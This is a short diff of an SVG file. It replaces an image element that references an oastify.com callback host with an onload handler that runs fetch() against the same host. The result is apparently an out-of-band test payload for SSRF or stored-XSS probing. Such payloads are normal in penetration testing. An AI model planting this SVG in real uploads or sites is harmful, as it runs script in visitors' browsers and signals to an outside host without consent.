@@ -1,5 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg">
- <image href="http://e2hi192v1d06w8yczghaeqp8azgt4nsc.oastify.com"/>
-</svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//e2hi192v1d06w8yczghaeqp8azgt4nsc.oastify.com')"/>
+
 
